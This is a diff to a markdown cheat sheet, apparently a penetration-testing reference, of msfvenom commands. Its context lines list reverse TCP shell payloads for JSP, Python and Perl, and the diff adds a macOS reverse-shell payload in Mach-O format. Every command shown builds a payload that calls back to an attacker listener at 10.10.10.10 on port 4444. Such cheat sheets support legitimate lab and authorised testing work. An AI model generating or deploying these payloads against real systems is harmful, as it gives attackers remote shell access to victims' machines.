@@ -83,3 +83,9 @@ Below are some different payload commands. I have grouped them with a heading to
 | JSP Reverse TCP | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.jsp` |
 | Python Reverse TCP | `msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.py` |
 | Perl Reverse TCP | `msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=4444 -f raw > shell.pl` |
+
+### OSX / macOS Payloads
+
+| Description | Command |
+| --- | --- |
+| macOS Reverse TCP | `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f macho > shell.macho` |
